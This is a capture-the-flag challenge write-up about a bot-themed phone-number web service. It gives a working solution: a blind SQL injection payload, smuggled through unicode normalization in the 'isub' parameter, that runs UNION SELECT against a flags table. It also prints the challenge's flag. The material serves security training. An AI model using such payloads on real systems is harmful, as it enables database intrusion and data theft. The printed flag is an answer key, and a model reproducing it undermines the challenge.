## Background

 Author: spipm
 Categories: Webservices
 Difficulty: Medium to Hard

## Technical

A web service accepts a phone number and does some operation on it. It shows a green-on-black interface that a bot is dialing some leaderbot.

## Story

Bots are developing this crazy idea of 'phone numbers' so they can directly contact each other without having to waste time on the internet. They're even developing an analog distributed database to increase productivity. Local leader bots will receive regular status updates from nearby bots. Check out the link to see the updates in action.
 
<img src="./dial.jpg" width="500">

## Exploit

One needs to perform blind SQL Injection via unicode normalization via a phone number.

http://localhost:2000/+31613371001;isub=a%CD%B4%20UNION%20SELECT%20flag%20from%20flags--

## Flag

brck{Th15_NumB3r_LoOks_n0RM4l_T0_m3}
